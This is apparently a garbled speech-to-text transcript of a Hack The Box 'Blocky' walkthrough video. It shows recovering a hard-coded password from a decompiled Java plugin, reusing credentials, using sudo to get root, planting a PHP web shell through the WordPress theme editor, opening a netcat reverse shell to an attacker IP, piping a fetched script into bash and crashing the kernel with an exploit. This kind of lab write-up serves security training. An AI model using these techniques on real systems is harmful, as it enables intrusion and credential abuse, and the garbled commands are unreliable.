 what's going on YouTube this is epic and we're doing the block machine from hack the box I believe this machine is set up like a minecraft server I've never played the game so I don't know but it's got everything one would need it's got the game server itself which is minecraft it's got WordPress so it can contact its user base random plugins and PHP myadmin because the people running these aren't sysadmin and don't know a thing about running servers which also leads to blanket pseudo access once you gain access to a user on the box the box itself was rated as medium I think it may be an easy box as long as you avoid all the rabbit holes which are pretty hard to avoid unless you just follow a step-by-step process on how you enumerate a box because the rabbit hole is WordPress and PHP myadmin itself it's very easy just be like ooh port 80s running ooh WordPress shiny and dig into that very deep and eventually you'll get a shell in the box as www.alexipanos.com because it just does everything for you without really asking a tool that is kind of in between running and map manually and sparta is called reckon eater the easiest way to find that is just to google github code dingo and that is because that's just the author the tool recognizers hard to spell and additionally it doesn't come up right away if you google that word so I'm just going to install the tool by going into slash up and doing a git clone on that github repo now we can just run the tool with Python and the directory reckon or retinoid oh all right at pi and it wants - t for target so 1010 1037 is block b's IP once an output directory so we'll just put PWD and backticks and it wants what type of scan we want do let's just do - - services to do a service scan and it's going to create a bunch of directories for us and it leads us to one of the things I don't like about it it was created specifically for the OS CP as we see an OS CP scanner by coding go the reason I don't like that is because it organizes things a bit weird always creates that proof dot txt file and things like that the really nice thing about it though is it's very friendly tells you oh we found FTP HTTP and SSH and now it's going to go into a more detailed tcp UDP and map scan which i assume is all ports because it takes forever but well that's running we can just create a new pane and look at what it's found so far so we go into the IP slash scans and it's got this findings dot txt file so if we look at that file if I could tell you it tells us things to run because it found an FTP it wants us to run this nmap script and that's just and map with a bunch of FTP things like checking anonymous access the pro FTP backdoor just common things you may find on vulnerable machines so just paste that in and it runs it doesn't find anything so let's go back to that text file the next thing it wants us to run is Hydra against FTP I'm gonna opt out of doing that but it also says Nick Doe for the HTTP service so let's paste that in there and it's gonna run Nick doe create a new pane and let's go to the next thing go busto would be a good thing to run because well let's see what directories exist on that web server Nick doe doesn't do a good job at numerating that so let's use go Buster the one thing is this sec list directory is not stock on cali if you go into user share word list and google cyclist github you can find it and install it and use a share word list so this works and I don't have go Buster in my path so I'm just gonna specify the absolute path for it and run that let's go back see what else it has open new pane will do cat findings and the last thing is it wants us to do like Medusa Hydra against SSH and grab the SSH keys but we're gonna ignore those so let's go into what go Buster found because that has finished so if we cat ten ten ten thirty seven go Buster common we do see the standard HTTP directories index dot PHP JavaScript PHP myadmin plug-in server status wiki and some WordPress things so if we go to index dot PHP we just see the standard WordPress page four not standard WordPress page but a wordpress page if we go to PHP myadmin we see PHP myadmin doing the plugins we see some jar files which a Java so let's download that and go back a few directories and before we start looking at let's just click wiki to see what that is under construction so while I do this I'm actually going to do another go Buster and we're going to specify slash wiki and I just over up my go Buster file crap oh well don't need it anymore anyways already finished so I guess we can look at it clear cat go Buster and the wiki doesn't have any directories on that so we can start ignoring that I wanted to go and look at that Java file so let's move that it was blocky kora and Java files jar files they are just compressed and zip so let's make a directory called decompile and we can unzip it and retrieve a few extra files so we got the manifest and a Java class file Java class files can be decompiled with a tool called jad where we run against that we get blocky cordage add if we just looked at the class file we'd see it's a binary you may be little piece together and be like cool SQL user SQL pass then we got root and this it's probably the password but if you look at the decompiled output very very plain text at what this is and we got root and a password so I'm going to create a file and also I want to go back to this window and we'll call that recon just so we stay organized jet is great for showing the decompile process but it's not that good in actual practical use so I'm gonna copy my password file out of this directory I'll quit cuz every lies that copied it into a bad spot and the reason why I say it's not that great for practical use is if we had a Java file like this grief prevention that had a lot of class files it is just very difficult to do so let's go move that here and make a new directory unzip it we get a bunch of class files and if we just did something old silly like xored it over to jad we get all the files it doesn't have their hierarchy and sometimes they overwrite each other and you get bad things we can grep cat dr. /pw and grep for let's say 8 y SQ see if that password is in there was it a much better approach to java decompiling is used a tool called JD GUI if you don't have that you can just do app to install JD - GUI and what this does is just gives you a nice IDE like interface to view the job of files there's a bunch of other Java decompilers I like IntelliJ but I don't know if that's free so I showed you the JD GUI option and if you wanted to see the rocky core that had the password very simple and we see the passwords there so that's about it for the Java decompiling the next step would be to try to brute-force away in with the password so discovered FTP so let's try that ten ten ten thirty seven try root and the password failure SSH SSH ten ten ten thirty seven and failed so this word is where I tend to not like reckoned wider because it's just personal preference the program's telling me what to do and distract me from my own process if I went back and thought about everything I would be like hmm there was a wordpress site and I never ran WP scan so that's what was missing so we'll do WP scan - - help head - 50 so we can see the options and I want don't pee scan - - URL 10-10-10 37 - - enumerate we want users all plugins Tim thumbs themes and we can log that - where is it 10-10-10 37 scans says can't create user shared apiece can so let's just put tactic PWD back date what happened was Doug peace can changes a working directory to use a share WP scan so I couldn't use the relative path so I'm putting PWD for a print working directory then slash so now we got an absolute path there this could take a little bit so I'm going to cheat and we'll just go to the wordpress page and not use Doug peace can but we got running the background in case we tend to need it if we click on this post we do see there is a user called notch which is very fitting with Minecraft you could also just do question book author equals one and it translates us to not CH if we do question mark author equals two we don't get another user but that is essentially what WP scans doing to enumerate the WordPress users so now we got a user let's put that password back on a clipboard and try SSH again so SSH not at ten ten ten thirty seven and we get right in so with this access let us do a Linux enumeration so let's do Linux yeah Linux probe ask is where I have stuff hosted and we can just draw in Python - am simple HTTP server what is our IP 10 10 14 30 so cool and 10 14 30 / when um Sh and pipe that over to bash and it's running on port 8000 because I don't specify 80 and now we're running the enumeration script shouldn't take too long okay scan complete let's just search for that blocky so we can get to beginning of where we ran it and go through this we have colonel information user group memberships root account billable shale Tron's everything standard there we see minecraft is running on what two five five six five if we we don't see the PID oh no we do 1282 so what I would do is make sure I have that copied and we can do a PS - yeah grab for that PID and we see notch is running that not root so even if we exploit in minecraft we just get to be the notch user the actual exploit is a pseudo exploit and Lenina misses it because it requires us to type the password so let's put that password back on a clipboard because if we do sudo - elder list what we can it says sudo password for not CH and most people may just ignore this because in CTF problems you normally don't have the password however this case we do paste the password in and we see not smear on everything so sudo su and now we a root so that is how you do that box the easy way let's backtrack a little bit and pretend that we didn't have the SSH password the password we got from that Java file just didn't get wasn't the same as the user password so how do we exploit that well we could FTP to ten ten ten thirty seven knotch and get logged in through FTP we do a dir we see a we're not just home directory so let's see is there it not SH directory no so let's make dirt SSH we created it and now what I want to do is copy my Linux public key there so we'll do CP root H ID RSA dot pub to my current directory where FTP is running and we can just put ID or I say dot pub it copied it and then we can run rename ID or a say dot pub to be authorized keys exit FTP SSH not at Block E or not blocker we don't have DNS resolution ten ten ten thirty seven and we log right in the downside to doing it this way is we don't know what the password is four notches account so if we did pseudo Who am I uh-huh we copy that sage key so we don't know that password so what I would do next is good a verb dub dub HTML let's see cat wp-config.php and we should have a password here F - I pass we got a database password to be something different so DB user is not true I'm guessing grep DB user no it's WordPress so this password doesn't actually buy us anything we could try s you to root with that see if that's the route pass it isn't there's also PHP myadmin and that configuration file is in I think Etsy so if we go to Etsy PHP myadmin cat config - DB dot PHP don't have mission only root does let's see pass the password here doesn't look like it so maybe Oh www.cancer.gov at G so let's go down that path we have access to PHP myadmin so let's try logging in we knew there was a user called WordPress and the WordPress config was this password so we can log right in and maybe other things in these tables but I'm just interested in logging into WordPress and for thoroughness let's just try WP dash admin and logging in as notch with that password doesn't exist so let us edit this password before we edit it's always good practice to save so you can restore it back to its standard state so I won't create file called hash and save it there we can also go back for good measure and copy that password into the PW file that was weird let's copy it and paste it there we go so we're logged in we can change this password so let's do PHP - a and we can echo what is it said password hash it's AK password default think that may be it there we go so the reason it didn't work the first time is I forgot a semicolon typed it again put a semicolon and it executed both lines which was an era so copy that hash paste it in one real effective and I put the password a zip sack so if we go back to the login we can now login and I was just thinking another thing we could have checked for easier way to get access is to go back to our SSH connection get a dub dub dub HTML let's - LA we can write - let's see dopey config so we could wipe that file out and put something and let's see derpy content themes 2015 understand what we could actually write - but maybe you'll find PHP files to write anyone then you could easily drop a shell xq and get on the box that way but we're gonna do it through WordPress so get a WordPress themes or is it editor we can edit let's do the header if we go back to a box cat shells PHP CMD we'll just throw this one in state the file and now we go 1010 1037 yep run LS we have code execution so all that was doing was modifying a PHP file through would press to put a web shell in so now we can NC - e-band bash was it 1010 1430 I think is my IP yeah 1430 and pour it 1 2 3 4 CL v NP 2 3 4 doesn't look like that worked so let's do a witch and see we do have NC on the box so go to pen test monkey shell load I love this netcat she'll see right here I'm going to throw this into boat make sure intercept is on throw it into repeater and we'll convert this to post request paste the shell URL encode it and we were 10 10 14:30 on port 1 2 3 4 I am still listening let go and we got a shell so Python - C import PT y PT y dot spawn and bash points are not found so let's try place on 3 okay we got that type of TTY so we can background it sty - a or is it sighs then to Y raw - echo foreground it s TTY - a rose 50 think call 189 is that it exactly drawing a blank at that s t - y command but we won't need it for this so we need to ignore that if you want you can go through one of the previous videos and get that exact syntax just for some reason forgot the argument but now that would www dot at C PHP myadmin cat config DB PHP and we get this password so if we do SEO paste that in authentication failure let's try not CH we have ask away from www.andyjenkins.com [Music] a password from the Java plug-in if we wanted to do this without let's say pseudo access didn't exist there's still a way to get route on this box and that is through the unstable kernel exploit so I'm gonna kill that pain go back to a SSH because that's always gonna be the best way to do this and I may be on different users so when you do my connection and see CD hops Lin prove ask I do not have the script here so we're going to go to Google we can turn our proxy off and Google what is it my next exploit suggester and last commit is 2014 on that one so that's what we don't want you're the one the MZ repo 22 days ago so this is the Linux exploit suggestion I want so download that CD prove esque Python Jam simple HTTP server port 80 go back to SSH we can curl 10 10 14 30 was it execute that and it outputs a bunch of potential exploits so we can just go up the list sudo pone it needs to be sued or and only works on SELinux enabled systems kind of funny that a security mechanism allows a probe ask but SELinux is not enabled so we can ignore sudo pone sudo a root tags rel seven and SELinux so we're gonna ignore that as well.you dev to this is a CVE from 2009 and a kernel is from 2017 so i'm gonna ignore that you'd have one pi stat corruption this going over here we can kind of look at it but i'm going to temporarily ignore it just because it's tagged as rel so Red Hat Enterprise the CVE we got Ubuntu 1404 kernel 4.40 and 1604 4.80 we are on Ubuntu 1604 which is xenial that is trustee but 14.8 for not 4.8 so i'm gonna ignore this just because of that and we could see we see kernel 4.4 there and I think at C LSB release we can see 1604 so if you wondering how I knew that that is how so that's not applicable or it may be we'd have to modify it and we don't want to 1604 four eight zero four one we were for eight that were for four zero six two so we can ignore that one because that's not an exact kernel DC CP 1604 let's go to the exploit opening text editor test it on four four zero six - so test it on our exact Colonel if we go over to the SEC list page we'll see one piece of key information that makes this really annoying is somewhere in this I don't wanna read the whole thing but maybe under a reply he says it is not stable at all it crashes quite a bit even though it was tested on this version so we'll copy that we try to GCC do not have GCC so let us paste this pen dot C paste paste this in go to the top compile instructions just GCC no special flags so GCC pone C - OH pone SCP pone - not at 1010 1037 go to SSH and I'm forgot the Col at the end they would get copied over almost guaranteed this is going to crash the server I've had about 10 percent success with it so let's try it boom waiting for time to execute and this isn't going to finish it would be quicker than that we crash the kernel so if we SSH not at 1010 1037 can no longer get in boxes crash so going to pause the video and reboot the box and resume I'm going to see how many times it takes to get root with this exploit so the box is back up let's go back here can't get in let's each back in let's try number two looks like it corrupted the file so let's pone SCP it back over and execute it again and we got root and actually worked that time and then crashed I no longer have shell so had it very shortly and then it immediately crashed again so let's try round number three this is H n again execute the file see if actually let's md5sum the follow see if it changed it's weird that it executed the first time then corrupted itself so eight D is seven one five so it changed the file so let's ESCP that back over SCP pown to ten ten ten thirty seven Scop it over let's see if it works just crash the box so let's go to round number four to see if we can get it to actually execute a command as root so let's SCP the file over SSH and crashed again so I think this may be going into number five maybe six so eventually we will get code execution through this box so you can imagine how frustrating it is to have to wait to reboot the box after all of these attempts so if blocky ever kept going unresponsive this is probably what someone was trying to do very annoying way to do that especially when you can just sudo it so pause the video again and we'll try again once the Box reboots so between video pauses I ran ID and put it on my clipboard so all I have to do is hit one key to copy ID to see if we can get this working let's try this again and we got code execution and the box crashed but you can see that that exploit does work it's just extremely unstable so you could have put like that SSH key trick on the clipboard to really copy it to root and then when you remove it the box you lost it so I don't know if it's actually exploitable I guess you could cat the flag really quick and that would be the only way you couldn't really get a show with this exploit because again not stable unless you could patch this exploit and get it working at which case you probably would have found the pseudo route because you're incredibly intelligent on doing that type of exploit so hope you guys enjoyed the Box take care and I'll see you next week